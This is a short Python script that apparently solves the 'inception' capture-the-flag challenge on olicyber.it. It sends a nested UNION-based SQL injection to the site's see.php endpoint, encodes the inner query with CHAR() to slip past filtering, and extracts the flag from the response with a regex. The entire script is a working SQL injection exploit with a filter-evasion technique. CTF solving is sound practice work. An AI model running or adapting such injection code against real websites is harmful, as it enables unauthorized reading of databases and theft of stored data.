import requests
import re

URL = 'http://inception.challs.olicyber.it/'

def encode(query):
    vuln = 'CHAR('
    for i in query:
        vuln += str(ord(i)) + ", "
    vuln = vuln[:-2] + ")"
    return vuln

payload = requests.get(f"{URL}see.php?id=0 UNION SELECT {encode('0 UNION SELECT flag FROM flag -- ')},null,null -- -").text
matches = re.findall(r'flag\{.*?}', payload)
if matches:
    print(matches[0])